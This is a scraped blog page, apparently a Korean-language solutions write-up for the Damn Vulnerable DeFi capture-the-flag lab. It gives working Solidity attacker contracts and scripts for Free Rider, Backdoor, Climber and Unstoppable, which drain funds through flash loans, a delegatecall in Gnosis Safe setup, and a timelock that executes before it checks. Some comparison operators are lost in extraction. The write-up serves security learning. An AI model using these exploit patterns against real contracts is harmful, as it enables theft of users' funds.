FlashLoanFreeRider { address uniswapPair; address weth; address payable nftMarketplace; address damnNft; address buyer; uint256[] public tokenIds = [0,1,2,3,4,5]; constructor(address _uniswapPair, address _weth, address payable _nftMarketplace, address _damnNft, address _buyer) { uniswapPair = _uniswapPair; weth = _weth; nftMarketplace = _nftMarketplace; damnNft = _damnNft; buyer = _buyer; } // UniswapV2's Flash Loan Interface  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external { IWETH9(weth).withdraw(amount0); // Borrow : received FlashLoan WETH - ETH  IFreeRiderNFTMarketplace(nftMarketplace).buyMany{value: address(this).balance}(tokenIds); // drain all NFT Token from marketplace  IWETH9(weth).deposit{value: address(this).balance}(); // ETH - WETH  IWETH9(weth).transfer(uniswapPair, IWETH9(weth).balanceOf(address(this))); // Pay back to FlashLoan  // Send NFT tokens to buyer  for(uint256 i=0 ; itokenIds.length ; i++) { IERC721(damnNft).safeTransferFrom(address(this), buyer, i); } } function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) { return IERC721Receiver.onERC721Received.selector; } function exploit(uint256 _flashLoanAmount) external { bytes memory data = \"EXPLOIT\"; IUniswapV2Pair(uniswapPair).swap(_flashLoanAmount, 0, address(this), data); } receive() external payable {} } free-rider.challenge.js\n// FreeRiderNFTMarketplace._buyOne()의 취약점으로 인해 15 ETH(NFT 1개당 가격)만 있으면 모든 NFT를 빼내올 수 있다.  // UniswapV2의 FlashLoan 이용! - UniswapV2Pair.sol - swap() // attacker-contracts/FlashLoanFreeRider.sol  this.exploitContract = await(await ethers.getContractFactory('FlashLoanFreeRider', attacker)).deploy( this.uniswapPair.address, this.weth.address, this.marketplace.address, this.nft.address, this.buyerContract.address, ); await this.exploitContract.exploit(ethers.utils.parseEther(\"15\"));  # 11. Backdoor Summary Gnosis Safe Wallet 레지스트리가 배포되었으며, 해당 레지스트리를 이용하여 지갑을 등록 및 deploy 시 보상으로 10 DTV 토큰을 받을 수 있다.\n해당 레지스트리는 GnosisSafeProxyFactory를 이용하여 Safety Check를 수행한다.\n현재 WalletRegistry에 benficiary로 등록된 사용자는 Alice, Bob, Charile, David 네 명이다.\nWalletRegistry는 네 명의 사용자에게 보상으로 지급할 40 DTV 토큰을 가지고 있으며, 네 사용자가 WalletRegistry를 이용하여 지갑을 생성/배포 시 보상으로 해당 지갑에 토큰(10 DTV)을 받을 수 있다.\n공격자는 해당 WalletRegistry로부터 40 DTV 토큰을 가져오는 것이 목표이다.\n각 사용자의 EOA는 현재 GnosisSafeProxyFactory를 통한 Proxy 컨트랙트 배포 이전에 beneficiary로 등록만 된 상태이다.\nGnosisSafeProxyFactory::createProxyWithCallback()을 통해 지갑이 생성 및 배포되며, 전달된 콜백함수(WalletRegistry::proxyCreated())에 의해 지갑 관련 모듈 세팅이나 보상 토큰 지급 등의 모듈 코드를 실행하게 된다.\n지갑 생성/배포 및 보상 분배 과정\n  (1) GnosisSafe(masterCopy) 및 GnosisSafeProxyFactory(walletFactory) 배포 (실제 환경에서는 이미 mainnet이나 testnet에 배포되어 있음)\n  (2) WalletRegistry 배포\n 생성자(constructor)에 GnosisSafe / GnosisSafeProxyFactory 컨트랙트 주소 전달 두 컨트랙트 주소는 WalletRegistry::proxyCreated()에서 사용    (3) 지갑 배포/생성을 원하는 사용자가 GnosisSafeProxyFactory::createProxyWithCallback() 호출하여 지갑 생성/배포 수행\n 이 때, 보상 수령을 위해 생성 이후 호출할 콜백함수를 WalletRegistry::proxyCreated()로 지정  GnosisSafeProxyFactory.sol\n ... /// @dev Allows to create new proxy contact, execute a message call to the new proxy and call a specified callback within one transaction /// @param _singleton Address of singleton contract. /// @param initializer Payload for message call sent to new proxy contract. /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract. /// @param callback Callback that will be invoced after the new proxy contract has been successfully deployed and initialized. function createProxyWithCallback( address _singleton, bytes memory initializer, uint256 saltNonce, IProxyCreationCallback callback ) public returns (GnosisSafeProxy proxy) { uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback))); proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback); if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce); } ...  해당 함수는 새로운 프록시 컨트랙트를 생성하는 용도로 사용되며, 아래와 같은 인자 사용 address _singleton : 싱글턴 컨트랙트의 주소로 GnosisSafe(masterCopy) 사용 bytes memory initializer : 새로 생성되는 프록시 컨트랙트에서 메시지 콜로 실행할 페이로드 전달 uint256 saltNonce : 새로운 프록시 컨트랙트의 주소 생성 시 솔트 값으로 사용 IProxyCreateCallback callback : 새로운 프록시 컨트랙트가 생성 및 배포된 후 실행할 콜백함수    (4) WalletRegistry::proxyCreated()가 개발자가 구현해놓은 콜백함수\n 기존에 등록된 beneficiary 사용자가 GnosisSafeProxyFactory::createProxyWithCallback()를 호출하여 지갑 생성/배포 시에, 10 DTV 토큰을 보상받도록 구현    WalletRegistry.sol\n... function proxyCreated( GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256 ) external override { // Make sure we have enough DVT to pay  require(token.balanceOf(address(this)) = TOKEN_PAYMENT, \"Not enough funds to pay\"); address payable walletAddress = payable(proxy); // Ensure correct factory and master copy  require(msg.sender == walletFactory, \"Caller must be factory\"); require(singleton == masterCopy, \"Fake mastercopy used\"); // Ensure initial calldata was a call to `GnosisSafe::setup`  require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, \"Wrong initialization\"); // payload : initialzer는 setup() 호출만 가능  // Ensure wallet initialization is the expected  require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, \"Invalid threshold\"); require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, \"Invalid number of owners\"); // Ensure the owner is a registered beneficiary  address walletOwner = GnosisSafe(walletAddress).getOwners()[0]; require(beneficiaries[walletOwner], \"Owner is not registered as beneficiary\"); // Remove owner as beneficiary  _removeBeneficiary(walletOwner); // Register the wallet under the owner's address  wallets[walletOwner] = walletAddress; // Pay tokens to the newly created wallet  token.transfer(walletAddress, TOKEN_PAYMENT); } GnosisSafeProxyFactory::createProxyWithCallback() 호출을 통해 지갑 배포/생성 시, 생성되는 지갑(프록시 컨트랙트)에서 실행할 페이로드를 bytes memory initializer 통해 전달할 수 있으며, 해당 페이로드는 callback 함수인 proxyCreated()에 전달된다.\n이후 proxyCreated() 함수에서는 initializer 데이터를 통해 GnosisSafe::setup() 함수만 호출이 가능하도록 개발되어 있다.\nGnosisSafe.sol\n... /// @dev Setup function sets initial storage of contract. /// @param _owners List of Safe owners. /// @param _threshold Number of required confirmations for a Safe transaction. /// @param to Contract address for optional delegate call. /// @param data Data payload for optional delegate call. /// @param fallbackHandler Handler for fallback calls to this contract /// @param paymentToken Token that should be used for the payment (0 is ETH) /// @param payment Value that should be paid /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin) function setup( address[] calldata _owners, uint256 _threshold, address to, // optional : delegate call 실행할 대상 주소 bytes calldata data, // optional : delegate call로 실행할 데이터 address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver ) external { // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice setupOwners(_owners, _threshold); if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler); // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules setupModules(to, data); // *** delegate call! if (payment  0) { // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself) // baseGas = 0, gasPrice = 1 and gas = payment = amount = (payment + 0) * 1 = payment handlePayment(payment, 0, 1, paymentToken, paymentReceiver); } emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler); } ... Exploit GnosisSafe::setup()는 setupModules() 함수를 통해 전달된 call data를 실행하며, delegate call 을 사용하기 때문에 취약점이 발생\n공격자는 기등록된 beneficiary의 EOA를 이용해 GnosisSafeProxyFactory::createProxyWithCallback()를 호출하여 지갑을 생성/배포한다.\n호출 시, initializer는 GnosisSafe::setup()을 실행하며, 인자는 다음과 같이 설정한다.\n address[] calldata _ownsers : beneficiary EOA address to : 공격자 컨트랙트 주소 bytes calldata data : delegate call로 실행될 페이로드이며, 공격자 컨트랙트에 구현된 drainEther()를 호출하도록 구성  호출 시, 콜백함수는 WalletRegistry::proxyCreated()를 사용한다.\nBackdoorExploit.sol\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; import \"@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol\"; import \"@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol\"; interface IGnosisSafeProxyFactor { function createProxyWithCallback(address _singleton, bytes memory initializer, uint256 saltNonce, IProxyCreationCallback callback) external returns (GnosisSafeProxy proxy); } contract BackdoorExploit { address public proxyFactor; address public walletRegistry; address public gnosisMaster; address payable public dtvToken; constructor(address _proxyFactor, address _walletRegistry, address _gnosisMaster, address payable _dtvToken) { proxyFactor = _proxyFactor; walletRegistry = _walletRegistry; gnosisMaster = _gnosisMaster; dtvToken = _dtvToken; } function drainEther(address spender, address token) external { IERC20(token).approve(spender, 10 ether); } function exploit(address _attacker, address[] memory _users, uint256 amounts) external { for(uint8 i=0 ; i_users.length ; i++) { address[] memory users = new address[](1); users[0] = _users[i]; // setupModules()'s delegatecall() allows an attacker to use user-defined function drainEther().  bytes memory encodedPayload = abi.encodeWithSignature(\"drainEther(address,address)\", address(this), dtvToken); bytes memory initializer = abi.encodeWithSignature(\"setup(address[],uint256,address,bytes,address,address,uint256,address)\", users, 1, address(this), encodedPayload, address(0), address(0), 0, address(0)); // when attacker's proxy contract deployed and initialized, user's DTV token benefit transfer approved by 'setup() - setupModules() - delegatecall(drainEther())'  GnosisSafeProxy proxy = IGnosisSafeProxyFactor(proxyFactor).createProxyWithCallback(gnosisMaster, initializer, 0, IProxyCreationCallback(walletRegistry)); // after each user deploys and initalizes the wallet proxy contract, attacker receives ether using transferFrom() : user - attacker  IERC20(dtvToken).transferFrom(address(proxy), _attacker, amounts); } } receive() external payable {} } backdoor.challenge.js\nthis.exploitContract = await ( await ethers.getContractFactory('BackdoorExploit', attacker) ).deploy(this.walletFactory.address, this.walletRegistry.address, this.masterCopy.address, this.token.address); await this.exploitContract.exploit(attacker.address, users, ethers.utils.parseEther(\"10\"));  # 12. Climber Summary 1000만개의 DTV 토큰을 보호하고 있는 Vault 컨트랙트(금고 역할)가 있으며, 해당 컨트랙트는 EIP-1822 UUPS 패턴에 따라 업그레이드가 가능한(Upgradeable) 형태이다.\nVault 컨트랙트의 현재 owner는 Timelock 컨트랙트이며, owner만이 withdraw()를 통해 아주 제한된 양(1 DTV)의 토큰만 출금이 가능하게 설계되어 있다.\n또한 긴급상황에서 모든 토큰을 빼낼 수 있는 권한을 가진 추가적인 계정(Sweeper)도 있다.\nTimelock 컨트랙트에서 Proposer 권한을 부여받은 계정만이 1시간 후에 실행할 수 있는 작업(Operation)을 schedule()을 통해 등록할 수 있다.\n공격자는 Vault 컨트랙트의 모든 토큰을 가져오는 것이 목표이다.\n// ClimberTimelock.sol ... function getOperationState(bytes32 id) public view returns (OperationState) { Operation memory op = operations[id]; if(op.executed) { return OperationState.Executed; } else if(op.readyAtTimestamp = block.timestamp) { return OperationState.ReadyForExecution; } else if(op.readyAtTimestamp  0) { return OperationState.Scheduled; } else { return OperationState.Unknown; } } function getOperationId( address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt ) public pure returns (bytes32) { return keccak256(abi.encode(targets, values, dataElements, salt)); } function schedule( address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt ) external onlyRole(PROPOSER_ROLE) { // only PROPOSER can add operations.  require(targets.length  0 \u0026\u0026 targets.length  256); require(targets.length == values.length); require(targets.length == dataElements.length); bytes32 id = getOperationId(targets, values, dataElements, salt); require(getOperationState(id) == OperationState.Unknown, \"Operation already known\"); operations[id].readyAtTimestamp = uint64(block.timestamp) + delay; operations[id].known = true; } /** Anyone can execute what has been scheduled via `schedule` */ function execute( address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt ) external payable { require(targets.length  0, \"Must provide at least one target\"); require(targets.length == values.length); require(targets.length == dataElements.length); bytes32 id = getOperationId(targets, values, dataElements, salt); // Vulnerable! Execute - Validation Check  // (1) Execute operation  for (uint8 i = 0; i  targets.length; i++) { targets[i].functionCallWithValue(dataElements[i], values[i]); // attacker - updateDelay, grantRole, transferOwnership, *schedule*  } // (2) Check that executed operation is valid  require(getOperationState(id) == OperationState.ReadyForExecution); operations[id].executed = true; } ... 취약점은 ClimberTimelock.sol의 execute()에 존재한다.\nschedule()\n PROPOSER_ROLE이 부여된 계정만이 실행 가능 targets / values / dataElements / salt 를 이용해 특정 operation을 식별할 수 있는 ID를 생성  [] 리스트 형태로 일련의 작업들을 묶어서 실행 가능   실행할 operation ID의 readyAtTimestamp = 현재 timestamp(schedule에 추가된 시간) + 1 hour(delay)로 설정  execute()\n PROPOSER_ROLE 권한을 가진 계정이 schedule()을 통해 추가한 operation을 ID를 기반으로 누구나 실행 가능한 것이 목적(..이지만 취약한 코드에 의해 누구나 operation 등록 및 실행이 가능) operation을 실행한 이후에, 해당 operation에 대한 ID 계산 및 scehdule 등록/적절 여부 판단 공격자가 다음과 같은 operation 목록을 생성 및 실행하여, Logic 컨트랙트인 ClimberVault의 ownership 획득 가능  (1) ClimberTimelock::updateDelay(0)  공격자가 실행한 operation이 require(getOperationState(id) == OperationState.ReadyForExecution);를 우회할 수 있도록 하기위해 실행   (2) AccessControl::grantRole(PROPOSER_ROLE, attacker_contract)  공격자가 생성한 컨트랙트에 PROPOSER_ROLE을 부여함으로써, ClimberTimelock::schedule()을 실행할 수 있는 권한 확보 공격자가 생성한 컨트랙트는 ClimberVault Logic 컨트랙트를 제어할 수 있는 권한 확보(PROPOSER_ROLE은 ADMIN_ROLE도 부여받음)   (3) OwnableUpgradeable::transferOwnership(attacker_eoa)  UUPS 패턴으로 배포된 ClimberVault Logic 컨트랙트의 ownership을 공격자에게 이전 - 공격자는 Logic 컨트랙트 업그레이드가 가능하도록 하는 권한 확보   (4) ClimberTimelock::schedule()  operation의 마지막에 schedule()을 호출함으로써, schedule에 operation 추가 및 require(getOperationState(id) == OperationState.ReadyForExecution); 우회      Exploit attacker-contracts/ClimberExploit.sol\n ClimberTimelock의 취약점을 이용하여 ClimberVault의 ownership 이전  // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; //import \"@openzeppelin/contracts/access/AccessControl.sol\";  interface IClimberTimelock { function schedule(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external; function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external; } contract ClimberExploit { address public attackerEOA; address public timelockAddr; address public vaultAddr; address[] public targets; uint256[] public values; bytes[] public dataElements; bytes32 public constant PROPOSER_ROLE = keccak256(\"PROPOSER_ROLE\"); constructor (address _attackerEOA, address _timelockAddr, address _vaultAddr) { attackerEOA = _attackerEOA; timelockAddr = _timelockAddr; vaultAddr = _vaultAddr; } function exploit() external { // updateDelay set to 0  targets.push(timelockAddr); values.push(0); dataElements.push(abi.encodeWithSignature(\"updateDelay(uint64)\", uint64(0))); // Granting the PROPOSER role to this attacker contract(ClimberExploit.sol)  // AccessControl.sol  targets.push(timelockAddr); values.push(0); dataElements.push(abi.encodeWithSignature(\"grantRole(bytes32,address)\", PROPOSER_ROLE, address(this))); // Transfer ownership of Logic Contract(ClimberVault) to attacker EOA  // OwnableUpgradeable.sol  targets.push(vaultAddr); values.push(0); dataElements.push(abi.encodeWithSignature(\"transferOwnership(address)\", attackerEOA)); // to bypass schedule check  targets.push(address(this)); values.push(0); dataElements.push(abi.encodeWithSignature(\"triggerSchedule()\")); // execute()  IClimberTimelock(timelockAddr).execute(targets, values, dataElements, keccak256(\"salt\")); } function triggerSchedule() external { // triggering VaultTimelock::schedule()  IClimberTimelock(timelockAddr).schedule(targets, values, dataElements, keccak256(\"salt\")); } } attacker-contracts/ClimberAttackerLogic.sol\n UUPS 패턴으로 배포되어있는 ClimberVault를 아래 공격자의 Logic 컨트랙트로 업그레이드  // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\"; import \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\"; import \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\"; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; /** * @title ClimberVault * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner. * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz) */ contract ClimberAttackerLogic is Initializable, OwnableUpgradeable, UUPSUpgradeable { uint256 public constant WITHDRAWAL_LIMIT = 1 ether; uint256 public constant WAITING_PERIOD = 15 days; uint256 private _lastWithdrawalTimestamp; address private _sweeper; modifier onlySweeper() { require(msg.sender == _sweeper, \"Caller must be sweeper\"); _; } /// @custom:oz-upgrades-unsafe-allow constructor  constructor() initializer {} function initialize() initializer external { // Initialize inheritance chain  __Ownable_init(); __UUPSUpgradeable_init(); // Deploy timelock and transfer ownership to it  //transferOwnership(address(new ClimberTimelock(admin, proposer)));  //_setSweeper(sweeper);  _setLastWithdrawal(block.timestamp); _lastWithdrawalTimestamp = block.timestamp; } ... // Allows trusted sweeper account to retrieve any tokens  function sweepFunds(address tokenAddress) external { IERC20 token = IERC20(tokenAddress); require(token.transfer(msg.sender, token.balanceOf(address(this))), \"Transfer failed\"); } ... // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade  function _authorizeUpgrade(address newImplementation) internal onlyOwner override {} } climber.challenge.js\n// Change CimberVault's owner to attacker using vulnerability let exploitContract = await (await ethers.getContractFactory('ClimberExploit', attacker)).deploy(attacker.address, this.timelock.address, this.vault.address); await exploitContract.connect(attacker).exploit(); // Upgrade to attacker's Contract this.climberAttackerLogic = await ethers.getContractFactory('ClimberAttackerLogic', attacker); let attacker_vault = await upgrades.upgradeProxy(this.vault.address, this.climberAttackerLogic); // drained all tokens from vault await attacker_vault.connect(attacker).sweepFunds(this.token.address); ",
  "wordCount" : "5101",
  "inLanguage": "en",
  "datePublished": "2022-01-11T00:00:00Z",
  "dateModified": "2022-01-11T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "inhack"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://inhack.github.io/posts/solution-damn-vulnerable-defi/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "inhack",
    "logo": {
      "@type": "ImageObject",
      "url": "https://inhack.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://inhack.github.io/" accesskey="h" title="inhack (Alt + H)">inhack</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                <ul class="lang-switch"><li>|</li>
                    <li>
                        <a href="https://inhack.github.io/kr/" title="Korean"
                            aria-label=":kr:">🇰🇷</a>
                    </li>
                </ul>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://inhack.github.io/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://inhack.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://inhack.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://inhack.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://inhack.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://inhack.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      [Solution] Damn Vulnerable DeFi
    </h1>
    <div class="post-description">
      Damn Vulnerable DeFi(The offensive security playground for decentralized finances) Solutions
    </div>
    <div class="post-meta"><span title='2022-01-11 00:00:00 +0000 UTC'>January 11, 2022</span>&nbsp;·&nbsp;24 min&nbsp;·&nbsp;inhack&nbsp;|&nbsp;Translations:
<ul class="i18n_list">
    <li>
        <a href="https://inhack.github.io/kr/posts/solution-damn-vulnerable-defi/">🇰🇷</a>
    </li>
</ul>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#-1-unstoppable" aria-label="# 1. Unstoppable"># 1. Unstoppable</a><ul>
                        
                <li>
                    <a href="#summary" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#-2-naive-receiver" aria-label="# 2. Naive receiver"># 2. Naive receiver</a><ul>
                        
                <li>
                    <a href="#summary-1" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit-1" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#-3---truster" aria-label="# 3. - Truster"># 3. - Truster</a><ul>
                        
                <li>
                    <a href="#summary-2" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit-2" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#-4-side-entrance" aria-label="# 4. Side entrance"># 4. Side entrance</a><ul>
                        
                <li>
                    <a href="#summary-3" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit-3" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#-5-the-rewarder" aria-label="# 5. The rewarder"># 5. The rewarder</a><ul>
                        
                <li>
                    <a href="#summary-4" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit-4" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#-6-selfie" aria-label="# 6. Selfie"># 6. Selfie</a><ul>
                        
                <li>
                    <a href="#summary-5" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit-5" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#-7-compromised" aria-label="# 7. Compromised"># 7. Compromised</a><ul>
                        
                <li>
                    <a href="#summary-6" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit-6" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#-8-puppet" aria-label="# 8. Puppet"># 8. Puppet</a><ul>
                        
                <li>
                    <a href="#summary-7" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit-7" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#-9-puppet-v2" aria-label="# 9. Puppet v2"># 9. Puppet v2</a><ul>
                        
                <li>
                    <a href="#summary-8" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit-8" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#-10-free-rider" aria-label="# 10. Free rider"># 10. Free rider</a><ul>
                        
                <li>
                    <a href="#summary-9" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit-9" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#-11-backdoor" aria-label="# 11. Backdoor"># 11. Backdoor</a><ul>
                        
                <li>
                    <a href="#summary-10" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit-10" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#-12-climber" aria-label="# 12. Climber"># 12. Climber</a><ul>
                        
                <li>
                    <a href="#summary-11" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#exploit-11" aria-label="Exploit">Exploit</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><hr>
<p><a href="https://www.damnvulnerabledefi.xyz/"><strong><em>&lsquo;Damn Vulnerable DeFi&rsquo;</em></strong></a> is an offensive security playground for decentralized finances.</p>
<p>This article offers a brief summary and exploit code of each challenge.</p>
<p>For detailed source code and contents, please check <a href="https://github.com/inhack/damn-vernerable-defi-solutions">my github repository</a>.</p>
<hr>
<h2 id="-1-unstoppable"># 1. Unstoppable<a hidden class="anchor" aria-hidden="true" href="#-1-unstoppable">#</a></h2>
<h3 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h3>
<p>Flash Loan을 제공하고 있는 Lending Pool을 대상으로 DoS 공격을 통해 기능을 멈추게하는 것이 목표이다.</p>
<p><strong>Flash Loan?</strong></p>
<blockquote>
<p>Flash Loan은 간단하게 설명하자면 &lsquo;무담보&rsquo; 대출로, 보통 사용자는 대출 풀에 소정의 수수료를 지급하고(물론 트랜잭션 실행에 대한 가스비도 소모) 토큰을 대출할 수 있다.</p>
<p>대출한 토큰을 가지고 다른 DeFi 서비스에 투자를 하던, 에어드랍 보상을 위한 스테이킹을 하던, 사용자가 상환 이전까지 사용할 수 있다.</p>
<p>하지만 Flash Loan의 대출-상환 프로세스는 &lsquo;단일&rsquo; 트랜잭션에서 이루어져야 하며, 상환 과정에서 대출받은 토큰만큼의 수량을 Pay Back하지 않는 경우 해당 트랜잭션이 revert된다.</p>
<p>revert가 된다는 것은 해당 트랜잭션이 블록에 포함되지 않아 PoW/PoS 등의 거래증명이 완료되지 않기 때문에, State Transition이 발생하지 않는다.</p>
<p>말이 어려운데 그냥 원금을 돌려놓지 않으면, 대출-상환 사이에 토큰을 옮기든 무엇을 하든 트랜잭션 revert로 인해 대출 실행 이전의 상태로 원복된다는 것이다.(수수료나 가스비만 소모)</p>
</blockquote>
<p>이더리움에서는 계정(컨트랙트 및 EOA)을 대상으로 강제로 Ether를 송신할 수 있으므로</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">uint256</span> balanceBefore <span style="color:#f92672">=</span> damnValuableToken.balanceOf(<span style="color:#66d9ef">address</span>(this));
require(balanceBefore <span style="color:#f92672">&gt;=</span> borrowAmount, <span style="color:#e6db74">&#34;Not enough tokens in pool&#34;</span>);

<span style="color:#75715e">// Ensured by the protocol via the `depositTokens` function
</span><span style="color:#75715e"></span>assert(poolBalance <span style="color:#f92672">==</span> balanceBefore);
</code></pre></div><p>와 같이 컨트랙트의 balance를 엄격하게 확인하는 코드를 작성하는 경우에 주의해야 한다.</p>
<p>위 코드로 인해 Lending Pool의 계좌 잔액이 1 wei만 늘어나더라도, <code>assert()</code>에 의해 이후의 코드가 실행되지 않는 DoS 상태로 빠질 수 있다.</p>
<h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
<p><strong>unstoppable.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">1</span>);      <span style="color:#75715e">// forcibly send 1 wei to lending pool
</span></code></pre></div><hr>
<h2 id="-2-naive-receiver"># 2. Naive receiver<a hidden class="anchor" aria-hidden="true" href="#-2-naive-receiver">#</a></h2>
<h3 id="summary-1">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-1">#</a></h3>
<p>Flash Loan을 제공하는 Lending Pool에서 대출 수수료로 1 ETH를 청구한다. 해당 Lending Pool을 이용하는 특정 사용자의 balance(10 ETH)를 drain하는 것이 목표이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// NaiveReceiverLenderPool.sol
</span><span style="color:#75715e"></span>...
<span style="color:#75715e">// msg.sender가 borrower인지 검증하는 로직이 없음 -&gt; 공격자가 임의의 사용자의 컨트랙트에 있는 잔고를 고갈시킬 수 있음(수수료 사용)
